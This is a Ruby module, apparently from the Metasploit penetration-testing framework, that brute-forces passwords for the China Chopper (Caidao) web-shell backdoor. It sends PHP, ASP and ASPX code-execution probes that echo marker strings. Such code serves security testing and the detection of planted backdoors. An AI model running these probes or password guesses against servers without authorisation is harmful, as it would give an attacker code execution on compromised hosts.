require 'metasploit/framework/login_scanner/http'

module Metasploit
  module Framework
    module LoginScanner

      # Chinese Caidao login scanner
      class Caidao < HTTP
        # Inherit LIKELY_PORTS, LIKELY_SERVICE_NAMES, and REALM_KEY from HTTP
        DEFAULT_PORT       = 80
        PRIVATE_TYPES      = [ :password ]
        LOGIN_STATUS       = Metasploit::Model::Login::Status # Shorter name

        # Checks if the target is Caidao Backdoor. The login module should call this.
        #
        # @return [Boolean] TrueClass if target is Caidao, otherwise FalseClass
        def check_setup
          @flag ||= Rex::Text.rand_text_alphanumeric(4)
          @lmark ||= Rex::Text.rand_text_alphanumeric(4)
          @rmark ||= Rex::Text.rand_text_alphanumeric(4)

          case uri
          when /php$/mi
            @payload = "$_=\"#{@flag}\";echo \"#{@lmark}\".$_.\"#{@rmark}\";"
            return true
          when /asp$/mi
            @payload = 'execute("response.write(""'
            @payload << "#{@lmark}"
            @payload << '""):response.write(""'
            @payload << "#{@flag}"
            @payload << '""):response.write(""'
            @payload << "#{@rmark}"
            @payload << '""):response.end")'
            return true
          when /aspx$/mi
            @payload = "Response.Write(\"#{@lmark}\");"
            @payload << "Response.Write(\"#{@flag}\");"
            @payload << "Response.Write(\"#{@rmark}\")"
            return true
          end
          false
        end

        def set_sane_defaults
          self.method = "POST" if self.method.nil?
          super
        end

        # Actually doing the login. Called by #attempt_login
        #
        # @param username [String] The username to try
        # @param password [String] The password to try
        # @return [Hash]
        #   * :status [Metasploit::Model::Login::Status]
        #   * :proof [String] the HTTP response body
        def try_login(username, password)
          res = send_request(
            'method'  => method,
            'uri'     => uri,
            'data'    => "#{password}=#{@payload}"
          )

          unless res
            return { :status => LOGIN_STATUS::UNABLE_TO_CONNECT, :proof => res.to_s }
          end

          if res && res.code == 200 && res.body.to_s.include?("#{@lmark}#{@flag}#{@rmark}")
            return { :status => Metasploit::Model::Login::Status::SUCCESSFUL, :proof => res.to_s }
          end

          { :status => Metasploit::Model::Login::Status::INCORRECT, :proof => res.to_s }
        end

        # Attempts to login to Caidao Backdoor. This is called first.
        #
        # @param credential [Metasploit::Framework::Credential] The credential object
        # @return [Result] A Result object indicating success or failure
        def attempt_login(credential)
          result_opts = {
            credential:  credential,
            status: Metasploit::Model::Login::Status::INCORRECT,
            proof: nil,
            host: host,
            port: port,
            protocol: 'tcp'
          }

          if ssl
            result_opts[:service_name] = 'https'
          else
            result_opts[:service_name] = 'http'
          end

          begin
            result_opts.merge!(try_login(credential.public, credential.private))
          rescue ::Rex::ConnectionError => e
            result_opts.merge!(status: LOGIN_STATUS::UNABLE_TO_CONNECT, proof: e.message)
          end
          Result.new(result_opts)
        end
      end
    end
  end
end
